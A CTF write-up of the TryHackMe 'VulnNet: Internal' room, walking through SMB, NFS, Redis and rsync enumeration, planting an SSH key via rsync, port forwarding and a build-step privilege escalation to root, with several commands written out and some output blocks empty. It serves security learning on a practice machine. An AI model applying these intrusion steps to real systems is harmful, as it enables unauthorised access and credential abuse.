# VulnNet: Internal

This is a write-up for the machine VulnNet: Internal located at: [https://tryhackme.com/room/vulnnetinternal](https://tryhackme.com/room/vulnnetinternal)

I ran an nmap scan

```c
nmap -T4 -A 10.10.98.192 -oN nmap_output.txt
```

This is the output I got:

```c

I then ran **smbmap -H IP\_Address**, and got the following output:

```c

```

I then ran **smbclient \\\\\\\10.10.98.192\\\shares**, and got the following output:

```c

In the **temp** folder, there was the following file:

```c
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021

  services.txt                        N       38  Sat Feb  6 06:45:09 2021
```

In the **data** folder, there was the following file:

```c
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021

  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
```

Looking through the files, I found the flag for the services.txt:

![](<../../.gitbook/assets/image (199).png>)

I then ran a **metasploit** module **auxiliary/scanner/rsync/modules\_list**. This is what I got from the result from it:

![](<../../.gitbook/assets/image (200).png>)

I then read [this write-up](https://cyberrat.medium.com/vulnnet-internal-tryhackeme-cad6ccb9ad54) and realized that I did not use the **showmount** command. I then followed the write-up to run **showmeant -e IP\_Address**. I then got the following:

![](<../../.gitbook/assets/image (201).png>)

I then mounted the system to my machine:

![](<../../.gitbook/assets/image (202).png>)

Viewing through the files I came across some sort of password in the redis.conf file:

![](<../../.gitbook/assets/image (203).png>)

I then followed the same write-up to understand my next step. This was to use **redis-cli** in order to connect to the database and see what is there using the pasword we found earlier. I ran **redis-cli -h 10.10.98.192 -a \<requirepass\_from\_earlier>** in order to login to the database. I then was able to find the flag for internal:

![](<../../.gitbook/assets/image (204).png>)

When I ran **LRANGE authlist 1 20**, I got the following:

![](<../../.gitbook/assets/image (205).png>)

The three values were the exact same, and seemed to be base64 encoded. I decoded it online and got the following:

![](<../../.gitbook/assets/image (206).png>)

So now we have to connect to rsync with this password:

![](<../../.gitbook/assets/image (207).png>)

There is a sys-internal directory that I ave to find a way to get access into. I followed the aforementioned write-up and ran the following commands (tweaked to work for me):

```c
mkdir local_storage
rsync -av rsync://rsync-connect@10.10.98.192/files local_storage
```

This allowed me to download the folder to my local drive. In that directory, I found the user.txt file:

![](<../../.gitbook/assets/image (208).png>)

I got stuck here, so I had to view the write-up again. I was meant to create an SSH keypair and upload it using rsync. So I ran the following commands:

```c
ssh-keygen -t rsa 
cat internals.pub | tee authorized_keys && chmod 600 authorized_keys
rsync -av authorized_keys rsync://rsync-connect@10.10.98.192/files/sys-internal/.ssh  
```

For the previous step, I ended up getting stuck, and found [this write-up](https://muzec0318.github.io/posts/vulnet.html) that actually clarified the situation for me. This same write-up led me to run **ss** **-tulpn** to find out what ports were open. I used the same write-up to figure out we have to do port forwarding. In order to do this, I ran the following command:

```c
ssh -i internals -L 8111:localhost:8111 sys-internal@10.10.98.192 
```

Visiting `localhost:8111` led me to the following page:

![](<../../.gitbook/assets/image (209).png>)

I then searched for the word **token** in the whole filesystem to find a token for the following webpage:

![](<../../.gitbook/assets/image (210).png>)

The second to last authentication token worked for me! I then created a new project:

![](<../../.gitbook/assets/image (211).png>)

I then created a build config:

![](<../../.gitbook/assets/image (212).png>)

I then went to Build Steps and followed a bit of [this write-up](https://infosecwriteups.com/tryhackme-writeup-vulnet-internal-9abe74955f32) for this part. I following the following image:

![](<../../.gitbook/assets/image (213).png>)

I then ran the script from the choice on top, and when I went back to my previous shell, I ran **/bin/bash -p**, and I was able to get root:

![](<../../.gitbook/assets/image (214).png>)

I wan then able to get the root flag:

![](<../../.gitbook/assets/image (215).png>)
